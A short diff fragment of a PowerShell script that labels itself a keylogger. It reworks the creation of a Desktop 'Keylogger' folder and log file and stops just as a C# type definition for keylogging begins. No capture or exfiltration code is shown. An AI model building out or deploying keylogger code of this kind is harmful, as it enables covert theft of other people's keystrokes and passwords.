@@ -1,13 +1,11 @@
-$desktopPath = [System.Environment]::GetFolderPath('Desktop')
-$logFolder = [System.IO.Path]::Combine($desktopPath, 'Keylogger')  # Creating a folder named 'Keylogger' on Desktop
-
-# Create the folder if it doesn't exist
-if (-not (Test-Path $logFolder)) {
-    New-Item -ItemType Directory -Path $logFolder
+# Define log file location
+$logfolder = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('Desktop'), 'Keylogger')
+if (-not (Test-Path $logfolder)) {
+    New-Item -ItemType Directory -Path $logfolder
 }
+$logfile = [System.IO.Path]::Combine($logfolder, 'keylogger_output.log')
 
-$logfile = [System.IO.Path]::Combine($logFolder, 'keylogger_output.log')
-
+# Start keylogging
 Add-Type -TypeDefinition @"
 using System;
 using System.IO;
